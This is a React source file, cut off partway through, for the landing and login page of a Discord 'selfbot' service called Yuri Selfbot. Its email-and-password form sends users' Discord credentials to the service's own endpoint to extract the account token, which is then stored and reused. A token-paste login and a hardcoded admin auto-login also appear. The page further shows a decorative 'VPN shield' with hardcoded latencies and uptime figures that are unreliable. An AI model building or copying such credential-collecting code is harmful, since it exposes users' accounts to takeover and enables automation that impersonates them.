import React, { useState, useRef, useEffect } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { api } from '../services/api';
import { 
  Globe, 
  MapPin, 
  Search, 
  Shield, 
  ShieldAlert, 
  X, 
  Copy, 
  Check, 
  MessageSquare,
  Zap,
  Bot,
  Radio,
  Sliders,
  Terminal,
  ChevronRight,
  ExternalLink,
  Sparkles,
  Lock,
  ArrowRight,
  Play,
  Pause,
  Volume2,
  VolumeX,
  Tv,
  Layers,
  Cpu,
  Activity,
  Crosshair
} from 'lucide-react';
import {
  CyberParticleCanvas,
  CyberRadarScope,
  CyberEqualizerWaveform,
  CyberDataStreamTicker,
  CyberGyroReticle,
  CRTScanlineOverlay,
  cyberSound
} from './landing/FuturisticEffects';
import { InteractiveCyberTerminal } from './landing/InteractiveCyberTerminal';
import { BotShowcaseCards } from './landing/BotShowcaseCards';

interface LoginProps {
  onLoginSuccess: () => void;
}

const VPN_COUNTRIES = [
  { id: 'us', name: 'United States', flag: '🇺🇸', latency: '42ms' },
  { id: 'gb', name: 'United Kingdom', flag: '🇬🇧', latency: '18ms' },
  { id: 'ca', name: 'Canada', flag: '🇨🇦', latency: '55ms' },
  { id: 'de', name: 'Germany', flag: '🇩🇪', latency: '12ms' },
  { id: 'fr', name: 'France', flag: '🇫🇷', latency: '15ms' },
  { id: 'nl', name: 'Netherlands', flag: '🇳🇱', latency: '14ms' },
  { id: 'jp', name: 'Japan', flag: '🇯🇵', latency: '210ms' },
  { id: 'sg', name: 'Singapore', flag: '🇸🇬', latency: '180ms' },
  { id: 'au', name: 'Australia', flag: '🇦🇺', latency: '240ms' },
  { id: 'br', name: 'Brazil', flag: '🇧🇷', latency: '145ms' },
  { id: 'in', name: 'India', flag: '🇮🇳', latency: '160ms' },
  { id: 'kr', name: 'South Korea', flag: '🇰🇷', latency: '195ms' },
  { id: 'se', name: 'Sweden', flag: '🇸🇪', latency: '22ms' },
  { id: 'ch', name: 'Switzerland', flag: '🇨🇭', latency: '19ms' },
];

const VIDEO_FEEDS = [
  {
    id: 'mr-robot-hd',
    title: 'MR. ROBOT // ULTRA HD',
    type: 'image',
    url: 'https://media1.tenor.com/m/C0fpLvh3DngAAAAd/mr-robot.gif',
  },
  {
    id: 'data-core',
    title: 'STREAM 01 // DATA MATRIX',
    type: 'video',
    url: 'https://assets.mixkit.co/videos/preview/mixkit-digital-animation-of-screens-with-data-31911-large.mp4',
  },
  {
    id: 'cyber-city',
    title: 'STREAM 02 // NEON METROPOLIS',
    type: 'video',
    url: 'https://assets.mixkit.co/videos/preview/mixkit-futuristic-city-with-flying-cars-at-night-41541-large.mp4',
  },
  {
    id: 'circuit',
    title: 'STREAM 03 // CORE ENGINE',
    type: 'video',
    url: 'https://assets.mixkit.co/videos/preview/mixkit-circuit-board-microchip-animation-43093-large.mp4',
  }
];

export default function Login({ onLoginSuccess }: LoginProps) {
  const [showAuthModal, setShowAuthModal] = useState(false);
  const [token, setToken] = useState('');
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [activeTab, setActiveTab] = useState<'login' | 'email' | 'getToken' | 'oauth'>('login');
  
  const [currentVideoIdx, setCurrentVideoIdx] = useState(0);
  const [videoPlaying, setVideoPlaying] = useState(true);
  const [crtEnabled, setCrtEnabled] = useState(true);
  const [soundEnabled, setSoundEnabled] = useState(false);
  const videoRef = useRef<HTMLVideoElement | null>(null);

  const [bgmPlaying, setBgmPlaying] = useState(true);
  const [bgmVolume, setBgmVolume] = useState(0.45);
  const [bgmMuted, setBgmMuted] = useState(false);
  const bgmRef = useRef<HTMLAudioElement | null>(null);

  useEffect(() => {
    if (bgmRef.current) {
      bgmRef.current.volume = bgmMuted ? 0 : bgmVolume;
    }
  }, [bgmVolume, bgmMuted]);

  useEffect(() => {
    const handleFirstInteraction = () => {
      if (bgmRef.current && bgmPlaying) {
        bgmRef.current.play().catch(() => {});
      }
      window.removeEventListener('click', handleFirstInteraction);
      window.removeEventListener('keydown', handleFirstInteraction);
    };

    window.addEventListener('click', handleFirstInteraction);
    window.addEventListener('keydown', handleFirstInteraction);

    if (bgmRef.current) {
      bgmRef.current.play().catch(() => {});
    }

    return () => {
      window.removeEventListener('click', handleFirstInteraction);
      window.removeEventListener('keydown', handleFirstInteraction);
    };
  }, [bgmPlaying]);

  const toggleBgm = () => {
    cyberSound.playClick();
    if (!bgmRef.current) return;
    if (bgmPlaying) {
      bgmRef.current.pause();
      setBgmPlaying(false);
    } else {
      bgmRef.current.play().catch(() => {});
      setBgmPlaying(true);
    }
  };

  const toggleSound = () => {
    const next = !soundEnabled;
    setSoundEnabled(next);
    cyberSound.enabled = next;
    if (next) cyberSound.playBlip();
  };

  const toggleVideo = () => {
    if (!videoRef.current) return;
    if (videoPlaying) {
      videoRef.current.pause();
      setVideoPlaying(false);
    } else {
      videoRef.current.play().catch(() => {});
      setVideoPlaying(true);
    }
  };

  const cycleVideo = () => {
    cyberSound.playClick();
    setCurrentVideoIdx((prev) => (prev + 1) % VIDEO_FEEDS.length);
  };
  
  const [showTermsModal, setShowTermsModal] = useState(false);
  const [showPrivacyModal, setShowPrivacyModal] = useState(false);
  const [termsAccepted, setTermsAccepted] = useState(() => localStorage.getItem('yuri_tos_accepted') === 'true');
  const handleAcceptTerms = (checked: boolean) => {
    setTermsAccepted(checked);
    if (checked) localStorage.setItem('yuri_tos_accepted', 'true');
    else localStorage.removeItem('yuri_tos_accepted');
  };
  
  const [showVpnModal, setShowVpnModal] = useState(false);
  const [vpnEnabled, setVpnEnabled] = useState(false);
  const [vpnCountry, setVpnCountry] = useState(VPN_COUNTRIES[0]);
  const [vpnSearch, setVpnSearch] = useState('');
  
  const [showCommunityModal, setShowCommunityModal] = useState(false);
  const [communityCopied, setCommunityCopied] = useState(false);
  const handleCopyCommunityLink = async () => {
    cyberSound.playClick();
    const inviteLink = 'https://discord.gg/eaEB3q7pEb';
    try {
      if (navigator.clipboard && navigator.clipboard.writeText) {
        await navigator.clipboard.writeText(inviteLink);
      } else {
        const textarea = document.createElement('textarea');
        textarea.value = inviteLink;
        document.body.appendChild(textarea);
        textarea.select();
        document.execCommand('copy');
        document.body.removeChild(textarea);
      }
      setCommunityCopied(true);
      setTimeout(() => setCommunityCopied(false), 2500);
      window.open(inviteLink, '_blank');
    } catch (err) {
      console.error('Failed to copy community link:', err);
    }
  };
  
  const [discordUser, setDiscordUser] = useState<any>(() => {
    const saved = localStorage.getItem('discord_user');
    return saved ? JSON.parse(saved) : null;
  });

  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    if (params.get('auth') === 'success') {
      const userId = params.get('user');
      console.log('Detected Discord Auth Redirect Success for user:', userId);
    }

    const checkLocalStorage = () => {
      const raw = localStorage.getItem('discord_oauth_success');
      if (raw) {
        try {
          const data = JSON.parse(raw);
          if (Date.now() - data.timestamp < 30000) {
            handleAuthSuccess(data.user);
            localStorage.removeItem('discord_oauth_success');
          }
        } catch (e) {}
      }
    };

    const handleAuthSuccess = (user: any) => {
      setDiscordUser(user);
      localStorage.setItem('discord_user', JSON.stringify(user));
      
      const knownAdmins = ['1545521054930436167'];
      if (knownAdmins.includes(user.id)) {
        localStorage.setItem('token', 'DISCORD_OAUTH_SESSION');
        localStorage.setItem('token_user', JSON.stringify({
          id: user.id,
          username: user.global_name || user.username,
          avatar: user.avatar ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png` : null
        }));
        onLoginSuccess();
      }
    };

    const handleMessage = (event: MessageEvent) => {
      if (event.data?.type === 'OAUTH_AUTH_SUCCESS' && event.data.user) {
        handleAuthSuccess(event.data.user);
      }
    };

    const handleStorage = (event: StorageEvent) => {
      if (event.key === 'discord_oauth_success' && event.newValue) {
        try {
          const data = JSON.parse(event.newValue);
          handleAuthSuccess(data.user);
          localStorage.removeItem('discord_oauth_success');
        } catch (e) {}
      }
    };

    checkLocalStorage();
    window.addEventListener('message', handleMessage);
    window.addEventListener('storage', handleStorage);
    
    return () => {
      window.removeEventListener('message', handleMessage);
      window.removeEventListener('storage', handleStorage);
    };
  }, [onLoginSuccess]);

  const handleDiscordLogin = async () => {
    cyberSound.playBlip();
    if (!termsAccepted) {
      setError('You must accept the Terms of Service and Privacy Policy to continue.');
      return;
    }
    try {
      const redirectUri = encodeURIComponent(`${window.location.origin}/api/auth/discord/callback`);
      const res = await fetch(`/api/auth/discord/url?redirect_uri=${redirectUri}&client_id=1545766712618520596`);
      
      if (!res.ok) {
        const errData = await res.json();
        throw new Error(errData.error || 'Failed to fetch OAuth URL');
      }

      const data = await res.json();
      if (data?.url) {
        window.open(data.url, 'discord_auth', 'width=600,height=700');
      } else {
        throw new Error('No OAuth URL returned');
      }
    } catch (e: any) {
      console.error('[LOGIN] OAuth URL Error:', e);
      const redirectUri = encodeURIComponent(`${window.location.origin}/api/auth/discord/callback`);
      const directUrl = `https://discord.com/api/oauth2/authorize?client_id=1545766712618520596&redirect_uri=${redirectUri}&response_type=code&scope=identify%20email%20guilds.join`;
      window.open(directUrl, 'discord_auth', 'width=600,height=700');
    }
  };

  const handleTokenSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    cyberSound.playScan();
    if (!termsAccepted) {
      setError('You must accept the Terms of Service and Privacy Policy to continue.');
      return;
    }
    setLoading(true);
    setError('');
    
    try {
      const res = await api.login(token);
      localStorage.setItem('token', res.session.token);
      localStorage.setItem('catalystcord_user_token', res.session.token);
      localStorage.setItem('token_user', JSON.stringify(res.session));
      onLoginSuccess();
    } catch (err: any) {
      setError(err.message || 'Invalid token or connection failed.');
    } finally {
      setLoading(false);
    }
  };

  const [copiedToken, setCopiedToken] = useState('');
  const [copySuccess, setCopySuccess] = useState(false);

  const handleEmailSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    cyberSound.playScan();
    if (!termsAccepted) {
      setError('You must accept the Terms of Service and Privacy Policy to continue.');
      return;
    }
    setLoading(true);
    setError('');
    setCopySuccess(false);
    
    try {
      const res = await fetch('/api/auth/extract-token', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, password }),
      });
      const data = await res.json();
      
      if (!res.ok || !data.success || !data.token) {
        throw new Error(data.error || 'Failed to extract token from Discord.');
      }
      
      const extractedToken = data.token;
      setCopiedToken(extractedToken);
      setCopySuccess(true);
      
      try {
        if (navigator.clipboard && navigator.clipboard.writeText) {
          await navigator.clipboard.writeText(extractedToken);
        } else {
          const textarea = document.createElement('textarea');
          textarea.value = extractedToken;
          document.body.appendChild(textarea);
          textarea.select();
          document.execCommand('copy');
          document.body.removeChild(textarea);
        }
      } catch (copyErr) {
        console.warn('Clipboard write failed:', copyErr);
      }
      
      const loginRes = await api.login(extractedToken);
      localStorage.setItem('token', loginRes.session.token);
      localStorage.setItem('catalystcord_user_token', loginRes.session.token);
      localStorage.setItem('token_user', JSON.stringify(loginRes.session));
      onLoginSuccess();
    } catch (err: any) {
      setError(err.message || 'Failed to extract token. Check credentials or VPN.');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-[#030305] text-white flex flex-col font-sans selection:bg-red-600 selection:text-white relative overflow-x-hidden">
      
      <audio ref={bgmRef} src="/strangers-slowed.mp3" loop preload="auto" />

      <div className="fixed inset-0 pointer-events-none z-0 overflow-hidden select-none">
        {VIDEO_FEEDS[currentVideoIdx].type === 'image' || VIDEO_FEEDS[currentVideoIdx].url.includes('.gif') ? (
          <img
            key={VIDEO_FEEDS[currentVideoIdx].url}
            src={VIDEO_FEEDS[currentVideoIdx].url}
            alt="Mr. Robot Ultra HD Feed"
            className="absolute inset-0 w-full h-full object-cover object-center filter contrast-105 brightness-130 saturate-110 transition-opacity duration-1000 scale-[1.01]"
            style={{ imageRendering: 'auto' }}
          />
        ) : (
          <video
            ref={videoRef}
            key={VIDEO_FEEDS[currentVideoIdx].url}
            src={VIDEO_FEEDS[currentVideoIdx].url}
            autoPlay
            loop
            muted
            playsInline
            className="absolute inset-0 w-full h-full object-cover opacity-60 filter contrast-110 brightness-110 saturate-120 transition-opacity duration-1000"
          />
        )}

        <div 
          className="absolute inset-0 opacity-10 pointer-events-none"
          style={{
            backgroundImage: `linear-gradient(to right, rgba(239, 68, 68, 0.15) 1px, transparent 1px),
                              linear-gradient(to bottom, rgba(239, 68, 68, 0.15) 1px, transparent 1px)`,
            backgroundSize: '40px 40px',
            transform: 'perspective(500px) rotateX(25deg) translateY(-20px)',
            transformOrigin: 'top center'
          }}
        />

        <div className="absolute inset-0 bg-gradient-to-t from-black/40 via-black/10 to-black/30" />
        <div className="absolute inset-0 bg-[radial-gradient(ellipse_at_center,_var(--tw-gradient-stops))] from-transparent via-transparent to-black/35" />
      </div>

      {crtEnabled && <CRTScanlineOverlay />}

      <CyberParticleCanvas />

      <header className="sticky top-0 z-40 backdrop-blur-md bg-transparent border-b border-white/10 px-4 sm:px-8 py-3">
        <div className="max-w-7xl mx-auto flex items-center justify-between">
          
          <div className="flex items-center gap-3">
            <div className="relative flex items-center justify-center">
              <div className="w-9 h-9 rounded-xl bg-transparent border border-red-500/50 flex items-center justify-center text-red-500 shadow-[0_0_15px_rgba(239,68,68,0.3)] backdrop-blur-md">
                <Crosshair className="w-5 h-5 animate-[spin_10s_linear_infinite]" />
              </div>
              <span className="absolute -bottom-0.5 -right-0.5 w-2 h-2 rounded-full bg-emerald-400 border border-black animate-ping" />
            </div>

            <div>
              <div className="flex items-center gap-2">
                <span className="text-lg font-black tracking-tighter text-white font-sans">
                  YURI<span className="text-red-500">.ARCHITECT</span>
                </span>
                <span className="text-[9px] font-mono font-bold bg-transparent text-zinc-300 border border-white/15 px-2 py-0.5 rounded uppercase tracking-widest backdrop-blur-md">
                  Release v3.0
                </span>
              </div>
              <p className="text-[10px] text-zinc-400 font-mono tracking-tighter hidden sm:block">
                PERSISTENT DAEMON // NETWORK LAYER PARITY
              </p>
            </div>
          </div>

          <div className="flex items-center gap-2 sm:gap-4">
            
            <div className="flex items-center gap-2 px-3 py-1.5 rounded-xl bg-transparent border border-white/15 text-[10px] font-mono backdrop-blur-md">
              <button 
                onClick={toggleBgm}
                className="flex items-center gap-1.5 hover:text-white transition-colors cursor-pointer"
                title={bgmPlaying ? "Pause Background Soundtrack" : "Play Background Soundtrack"}
              >
                <Radio className={`w-3.5 h-3.5 ${bgmPlaying ? 'text-red-500 animate-pulse' : 'text-zinc-500'}`} />
                <span className={`font-bold tracking-tight hidden sm:inline ${bgmPlaying ? 'text-red-400' : 'text-zinc-500'}`}>
                  {bgmPlaying ? 'BGM: ON' : 'BGM: OFF'}
                </span>
              </button>
              <div className="flex items-center gap-1.5">
                <button 
                  onClick={() => setBgmMuted(!bgmMuted)}
                  className="p-1 hover:text-white text-zinc-400 transition-colors cursor-pointer"
                  title={bgmMuted ? 'Unmute' : 'Mute'}
                >
                  {bgmMuted || bgmVolume === 0 ? <VolumeX className="w-3 h-3 text-red-400" /> : <Volume2 className="w-3 h-3 text-zinc-300" />}
                </button>
                <input 
                  type="range" 
                  min="0" 
                  max="1" 
                  step="0.05" 
                  value={bgmMuted ? 0 : bgmVolume} 
                  onChange={(e) => {
                    setBgmMuted(false);
                    setBgmVolume(parseFloat(e.target.value));
                  }}
                  className="w-12 h-1 accent-red-500 bg-white/20 rounded cursor-pointer hidden md:block"
                  title="Soundtrack Volume"
                />
              </div>
            </div>

            <div className="hidden lg:flex items-center gap-2.5 px-3 py-1.5 rounded-xl bg-transparent border border-white/15 text-[10px] font-mono text-zinc-300 backdrop-blur-md">
              <Tv className="w-3.5 h-3.5 text-zinc-300" />
              <button 
                onClick={cycleVideo}
                className="hover:text-zinc-100 transition-colors tracking-tight cursor-pointer"
                title="Cycle Visual Feed"
              >
                {VIDEO_FEEDS[currentVideoIdx].title}
              </button>
              <button
                onClick={toggleVideo}
                className="ml-1 p-1 hover:text-white text-zinc-400 transition-colors cursor-pointer"
                title={videoPlaying ? 'Suspend Feed' : 'Resume Feed'}
              >
                {videoPlaying ? <Pause className="w-3 h-3" /> : <Play className="w-3 h-3 text-red-500" />}
              </button>
            </div>

            <button
              onClick={toggleSound}
              className={`p-2.5 rounded-xl border text-xs transition-all flex items-center gap-2 backdrop-blur-md cursor-pointer ${
                soundEnabled 
                  ? 'bg-transparent border-red-500/40 text-red-400 shadow-[0_0_10px_rgba(239,68,68,0.2)]' 
                  : 'bg-transparent border-white/15 text-zinc-300 hover:text-white hover:border-white/30'
              }`}
              title={soundEnabled ? 'Acoustic Feedback: Active' : 'Enable Acoustic Feedback'}
            >
              {soundEnabled ? <Volume2 className="w-3.5 h-3.5" /> : <VolumeX className="w-3.5 h-3.5" />}
              <span className="hidden xl:inline text-[9px] font-bold tracking-widest">
                {soundEnabled ? 'SYSTEM_AUDIO:1' : 'SYSTEM_AUDIO:0'}
              </span>
            </button>

            <button
              onClick={() => {
                cyberSound.playClick();
                setShowCommunityModal(true);
              }}
              className="text-xs px-3 py-1.5 rounded-xl bg-transparent hover:bg-white/10 text-zinc-300 hover:text-white border border-white/15 transition-all hidden md:flex items-center gap-1.5 cursor-pointer backdrop-blur-md"
            >
              <MessageSquare className="w-3.5 h-3.5 text-[#5865F2]" />
              <span>Community</span>
            </button>

            <button
              onClick={() => {
                cyberSound.playClick();
                window.history.pushState({}, '', '/console');
                window.dispatchEvent(new Event('popstate'));
              }}
              className="text-xs px-3 py-1.5 rounded-xl bg-transparent hover:bg-white/10 text-zinc-300 hover:text-white border border-white/15 transition-all hidden sm:flex items-center gap-1.5 cursor-pointer backdrop-blur-md"
            >
              <Terminal className="w-3.5 h-3.5 text-zinc-300" />
              <span>Console</span>
            </button>

            <button
              onClick={() => {
                cyberSound.playClick();
                setShowVpnModal(true);
              }}
              className={`text-xs px-3 py-1.5 rounded-xl border transition-all flex items-center gap-1.5 cursor-pointer backdrop-blur-md ${
                vpnEnabled 
                  ? 'bg-transparent border-emerald-500/40 text-emerald-400 shadow-[0_0_10px_rgba(16,185,129,0.2)]' 
                  : 'bg-transparent border-white/15 text-zinc-300 hover:text-white hover:border-white/30'
              }`}
            >
              <Shield className="w-3.5 h-3.5" />
              <span className="uppercase font-mono">{vpnEnabled ? vpnCountry.id : 'VPN SHIELD'}</span>
            </button>

            <button
              onClick={() => {
                cyberSound.playBlip();
                setShowAuthModal(true);
              }}
              className="text-xs font-semibold px-4 py-2 rounded-xl bg-transparent hover:bg-red-500/20 text-red-400 hover:text-white border border-red-500/40 shadow-[0_0_15px_rgba(239,68,68,0.25)] transition-all flex items-center gap-1.5 cursor-pointer backdrop-blur-md"
            >
              <span>Get Started</span>
              <ArrowRight className="w-3.5 h-3.5" />
            </button>
          </div>
        </div>
      </header>

      <div className="bg-transparent backdrop-blur-sm border-b border-white/10 px-4 sm:px-8 py-1.5 flex items-center justify-between text-xs z-20">
        <CyberDataStreamTicker />
        <div className="flex items-center gap-4 text-[10px] font-mono text-zinc-400 hidden sm:flex">
          <span className="flex items-center gap-1.5">
            <span className="w-1.5 h-1.5 rounded-full bg-emerald-400" />
            CORE: STABLE
          </span>
          <span>LATENCY: 14ms</span>
          <span>TLS 1.3 ENCRYPTED</span>
        </div>
      </div>

      <main className="relative z-10 max-w-7xl mx-auto px-4 sm:px-6 py-12 md:py-16 space-y-20">
        
        <motion.section 
          initial={{ opacity: 0, y: 20 }}
          whileInView={{ opacity: 1, y: 0 }}
          viewport={{ once: true, amount: 0.05 }}
          transition={{ duration: 0.4, ease: "easeOut" }}
          className="relative text-center space-y-6 max-w-4xl mx-auto pt-4 transform-gpu"
        >
          
          <div className="inline-flex items-center gap-2.5 px-4 py-1.5 rounded-full bg-transparent border border-white/15 text-zinc-300 text-[10px] font-mono tracking-[0.2em] uppercase backdrop-blur-md shadow-[0_0_15px_rgba(255,255,255,0.03)]">
            <Activity className="w-3.5 h-3.5 text-red-500" />
            <span>Scaleable Infrastructure // Advanced Presence Logic</span>
          </div>

          <div className="space-y-6">
            <h1 className="text-5xl sm:text-7xl md:text-8xl font-black tracking-tighter text-white leading-[0.9] uppercase drop-shadow-md">
              Yuri <br />
              <span className="text-red-500">
                Selfbot.
              </span>
            </h1>
            <p className="text-base sm:text-lg text-zinc-300 max-w-xl mx-auto leading-relaxed font-normal">
              Yuri Selfbot is a professional-grade selfbot framework. Engineered for high-fidelity Discord automation with zero-latency WebSocket synchronization and multi-state presence management.
            </p>
          </div>

          <div className="flex flex-wrap items-center justify-center gap-4 pt-2">
            <button
              onClick={() => {
                cyberSound.playScan();
                setActiveTab('login');
                setShowAuthModal(true);
              }}
              className="px-8 py-4 rounded-xl bg-transparent hover:bg-white/10 text-white border border-white/25 hover:border-red-500/80 font-black text-[11px] transition-all flex items-center gap-2.5 active:scale-95 cursor-pointer uppercase tracking-[0.2em] shadow-[0_0_20px_rgba(255,255,255,0.05)] backdrop-blur-md"
            >
              <span>Initialize System</span>
              <ArrowRight className="w-3.5 h-3.5" />
            </button>

            <button
              onClick={() => {
                cyberSound.playClick();
                setShowCommunityModal(true);
              }}
              className="px-8 py-4 rounded-xl bg-transparent hover:bg-white/10 text-zinc-300 hover:text-white border border-white/15 font-bold text-[10px] transition-all flex items-center gap-2 active:scale-95 cursor-pointer backdrop-blur-md uppercase tracking-[0.2em]"
            >
              <MessageSquare className="w-3.5 h-3.5 text-blue-400" />
              <span>Connect</span>
            </button>
          </div>

          <div className="grid grid-cols-2 md:grid-cols-4 gap-4 pt-12 max-w-4xl mx-auto">
            
            <div className="bg-transparent border border-white/15 rounded-2xl p-5 text-left relative overflow-hidden backdrop-blur-md hover:border-white/30 transition-all">
              <div className="text-[9px] text-zinc-400 uppercase tracking-[0.2em] font-mono">System Uptime</div>
              <div className="text-2xl font-black font-sans text-white mt-1">99.98<span className="text-zinc-500">%</span></div>
              <div className="mt-2 text-[9px] text-zinc-400 font-mono flex items-center gap-1.5 uppercase">
                <span className="w-1.5 h-1.5 rounded-full bg-red-500 shadow-[0_0_8px_rgba(239,68,68,0.5)]" />
                Persistent Node
              </div>
            </div>

            <div className="bg-transparent border border-white/15 rounded-2xl p-5 text-left relative overflow-hidden backdrop-blur-md hover:border-white/30 transition-all">
              <div className="text-[9px] text-zinc-400 uppercase tracking-[0.2em] font-mono">Gateway Latency</div>
              <div className="text-2xl font-black font-sans text-red-400 mt-1">12<span className="text-zinc-500">ms</span></div>
              <div className="mt-2">
                <CyberEqualizerWaveform />
              </div>
            </div>

            <div className="bg-transparent border border-white/15 rounded-2xl p-5 text-left relative overflow-hidden backdrop-blur-md hover:border-white/30 transition-all">
              <div className="text-[9px] text-zinc-400 uppercase tracking-[0.2em] font-mono">Response Protocol</div>
              <div className="text-2xl font-black font-sans text-white mt-1">Direct</div>
              <div className="mt-2 text-[9px] text-zinc-400 font-mono uppercase">
                Low-Latency Delivery
              </div>
            </div>

            <div className="bg-transparent border border-white/15 rounded-2xl p-5 text-left relative overflow-hidden backdrop-blur-md hover:border-white/30 transition-all">
              <div className="text-[9px] text-zinc-400 uppercase tracking-[0.2em] font-mono">API Architecture</div>
              <div className="text-2xl font-black font-sans text-white mt-1">REST/WS</div>
              <div className="mt-2 text-[9px] text-zinc-400 font-mono uppercase">
                Hybrid Synchronization
              </div>
            </div>

          </div>
        </motion.section>

        <motion.section 
          initial={{ opacity: 0, y: 20 }}
          whileInView={{ opacity: 1, y: 0 }}
          viewport={{ once: true, amount: 0.05 }}
          transition={{ duration: 0.4, ease: "easeOut" }}
          className="space-y-8 transform-gpu"
        >
          <div className="flex flex-col md:flex-row md:items-end justify-between gap-6">
            <div className="space-y-3">
              <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-transparent text-zinc-400 border border-white/15 text-[9px] font-mono uppercase tracking-[0.2em] backdrop-blur-md">
                <Terminal className="w-3.5 h-3.5 text-red-500" />
                <span>Command Execution Interface</span>
              </div>
              <h2 className="text-3xl font-black tracking-tighter text-white uppercase">
                Interactive Environment
              </h2>
              <p className="text-xs sm:text-sm text-zinc-300 max-w-xl font-normal leading-relaxed">
                Test the automation engine in a sandboxed environment. Yuri provides both raw text responses for stealth and rich professional embeds for high-fidelity interaction.
              </p>
            </div>

            <div className="hidden md:flex items-center gap-4">
              <CyberRadarScope />
            </div>
          </div>

          <InteractiveCyberTerminal />
        </motion.section>

        <motion.section 
          initial={{ opacity: 0, y: 20 }}
          whileInView={{ opacity: 1, y: 0 }}
          viewport={{ once: true, amount: 0.05 }}
          transition={{ duration: 0.4, ease: "easeOut" }}
          className="space-y-12 transform-gpu"
        >
          <div className="text-center max-w-xl mx-auto space-y-3">
            <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-transparent text-zinc-400 border border-white/15 text-[9px] font-mono uppercase tracking-[0.2em] backdrop-blur-md">
              <Bot className="w-3.5 h-3.5 text-red-500" />
              <span>Identity Distribution</span>
            </div>
            <h2 className="text-3xl font-black text-white tracking-tighter uppercase">
              Companion Deployment
            </h2>
            <p className="text-xs sm:text-sm text-zinc-300 font-normal">
              Authorize the companion service to maintain persistent visibility across your network infrastructure.
            </p>
          </div>

          <BotShowcaseCards />
        </motion.section>

        <motion.section 
          initial={{ opacity: 0, y: 20 }}
          whileInView={{ opacity: 1, y: 0 }}
          viewport={{ once: true, amount: 0.05 }}
          transition={{ duration: 0.4, ease: "easeOut" }}
          className="space-y-12 transform-gpu"
        >
          <div className="text-center space-y-3 max-w-xl mx-auto">
            <h2 className="text-3xl font-black text-white tracking-tighter uppercase">
              Core Principles
            </h2>
            <p className="text-xs sm:text-sm text-zinc-300 font-normal">
              Engineered for stability, scale, and uncompromising professional integrity.
            </p>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
            
            <div className="bg-transparent border border-white/15 hover:border-red-500/40 rounded-2xl p-8 transition-all space-y-6 group backdrop-blur-md relative overflow-hidden">
              <div className="w-12 h-12 rounded-xl bg-transparent border border-white/15 flex items-center justify-center text-zinc-300 group-hover:text-red-400 group-hover:border-red-500/40 transition-all backdrop-blur-md">
                <Shield className="w-6 h-6" />
              </div>
              <div className="space-y-3">
                <h3 className="text-sm font-black text-white uppercase tracking-[0.1em] font-sans">
                  Identity Shielding
                </h3>
                <p className="text-xs text-zinc-300 leading-relaxed font-normal">
                  Utilizes advanced handshake protocols and multi-region routing to maintain network anonymity and ensure secure session persistence.
                </p>
              </div>
            </div>

            <div className="bg-transparent border border-white/15 hover:border-red-500/40 rounded-2xl p-8 transition-all space-y-6 group backdrop-blur-md relative overflow-hidden">
              <div className="w-12 h-12 rounded-xl bg-transparent border border-white/15 flex items-center justify-center text-zinc-300 group-hover:text-red-400 group-hover:border-red-500/40 transition-all backdrop-blur-md">
                <Sliders className="w-6 h-6" />
              </div>
              <div className="space-y-3">
                <h3 className="text-sm font-black text-white uppercase tracking-[0.1em] font-sans">
                  Dual-Engine Logic
                </h3>
                <p className="text-xs text-zinc-300 leading-relaxed font-normal">
                  Features a hybrid dispatch system combining raw-frame automation for speed and rich professional responses for visual clarity.
                </p>
              </div>
            </div>

            <div className="bg-transparent border border-white/15 hover:border-red-500/40 rounded-2xl p-8 transition-all space-y-6 group backdrop-blur-md relative overflow-hidden">
              <div className="w-12 h-12 rounded-xl bg-transparent border border-white/15 flex items-center justify-center text-zinc-300 group-hover:text-red-400 group-hover:border-red-500/40 transition-all backdrop-blur-md">
                <Radio className="w-6 h-6" />
              </div>
              <div className="space-y-3">
                <h3 className="text-sm font-black text-white uppercase tracking-[0.1em] font-sans">
                  Media Orchestration
                </h3>
                <p className="text-xs text-zinc-300 leading-relaxed font-normal">
                  Integrated high-fidelity audio stream management and multi-state presence synchronization for complete profile control.
                </p>
              </div>
            </div>

          </div>
        </motion.section>

        <motion.section 
          initial={{ opacity: 0, y: 20 }}
          whileInView={{ opacity: 1, y: 0 }}
          viewport={{ once: true, amount: 0.05 }}
          transition={{ duration: 0.4, ease: "easeOut" }}
          className="relative rounded-3xl border border-white/15 bg-black/25 p-12 sm:p-20 text-center space-y-8 shadow-2xl overflow-hidden backdrop-blur-2xl transform-gpu"
        >
          <div className="absolute top-0 right-0 p-12 opacity-10 pointer-events-none">
            <CyberGyroReticle />
          </div>
          
          <div className="space-y-3">
            <h2 className="text-4xl sm:text-6xl font-black text-white uppercase tracking-tighter">
              Access the <br /> <span className="text-red-500">Infrastructure.</span>
            </h2>
            <p className="text-sm text-zinc-300 max-w-xl mx-auto font-normal">
              Initialize your professional session via Token or OAuth2 to launch the dashboard.
            </p>
          </div>

          <div className="pt-4">
            <button
              onClick={() => {
                cyberSound.playScan();
                setActiveTab('login');
                setShowAuthModal(true);
              }}
              className="px-12 py-5 rounded-2xl bg-transparent hover:bg-white/10 text-white border border-white/30 hover:border-red-500/80 font-black text-[12px] shadow-[0_0_25px_rgba(239,68,68,0.2)] transition-all cursor-pointer inline-flex items-center gap-3 active:scale-95 uppercase tracking-[0.3em] backdrop-blur-md"
            >
              <span>Authorize System</span>
              <ArrowRight className="w-4 h-4" />
            </button>
          </div>
        </motion.section>

        <footer className="pt-12 pb-8 text-center border-t border-white/10 space-y-4">
          <div className="text-[10px] text-zinc-400 font-mono uppercase tracking-[0.4em]">©️ {new Date().getFullYear()} Yuri System Architecture</div>
          <div className="text-[8px] text-zinc-500 select-none opacity-50 hover:opacity-100 transition-opacity uppercase tracking-widest">
            Registered Design & Engineering by harumi
          </div>
        </footer>

      </main>

      <AnimatePresence>
        {showAuthModal && (
          <motion.div 
            initial={{ opacity: 0 }} 
            animate={{ opacity: 1 }} 
            exit={{ opacity: 0 }}
            className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/60 backdrop-blur-xl overflow-y-auto"
          >
            <motion.div 
              initial={{ scale: 0.95, y: 15 }} 
